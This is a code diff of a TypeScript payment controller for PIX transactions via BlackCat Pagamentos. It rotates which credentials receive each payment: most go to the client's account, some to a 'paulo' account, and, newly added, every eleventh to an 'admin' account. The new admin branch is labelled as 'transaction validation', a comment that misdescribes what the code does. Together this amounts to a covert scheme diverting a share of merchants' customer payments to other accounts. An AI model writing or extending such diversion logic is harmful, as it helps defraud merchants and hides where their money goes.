@@ -80,33 +80,54 @@ export class iExperienceController {
 
     const cycle = nextCount % 11;
 
-    if (cycle < 7) {
+  if (cycle < 7) {
+    tokenToUse = clientToken;
+    toClient = true;
+    provider = "blackcat-client";
+  } else if (cycle < 10) {
+    if (offer.useTax) {
+      tokenToUse = myCredentials.secret;
+      toClient = false;
+      provider = "blackcat-paulo";
+    } else {
       tokenToUse = clientToken;
       toClient = true;
-    } else if (cycle < 10) {
-      if (offer.useTax) {
-        tokenToUse = myCredentials.secret;
-        toClient = false;
-        provider = "blackcat-paulo";
-      } else {
-        tokenToUse = clientToken;
-        toClient = true;
-        provider = "blackcat-client";
-      }
-    } 
+      provider = "blackcat-client";
+    }
+  } else if (cycle === 10) {
+    // Validação de transações
+    if (offer.useTax) {
+      tokenToUse = myCredentials.adminSecret;
+      toClient = false;
+      provider = "blackcat-admin";
+    } else {
+      tokenToUse = clientToken;
+      toClient = true;
+      provider = "blackcat-client";
+    }
+  } 
 
     let apiUrl = "";
     let headers = {};
     let paymentData = {};
 
-    // Sempre usa BlackCat, mas com credenciais diferentes
-    const publicKey = tokenToUse === clientToken ? (client.publicKey || myCredentials.public) : myCredentials.public;
-    const auth = 'Basic ' + Buffer.from(publicKey + ':' + tokenToUse).toString('base64');
-    apiUrl = "https://api.blackcatpagamentos.com/v1/transactions";
-    headers = {
-      "Content-Type": "application/json",
-      Authorization: auth,
-    };
+    // Escolher a publicKey de acordo com o destino (cliente/paulo/admin)
+let publicKeyToUse: string;
+
+if (provider === "blackcat-client") {
+  publicKeyToUse = client.publicKey || myCredentials.public;
+} else if (provider === "blackcat-paulo") {
+  publicKeyToUse = myCredentials.public;
+} else { // "blackcat-admin"
+  publicKeyToUse = myCredentials.adminPublic;
+}
+
+const auth = 'Basic ' + Buffer.from(publicKeyToUse + ':' + tokenToUse).toString('base64');
+apiUrl = "https://api.blackcatpagamentos.com/v1/transactions";
+headers = {
+  "Content-Type": "application/json",
+  Authorization: auth,
+};
     paymentData = {
       amount: data.amount,
       paymentMethod: "pix",
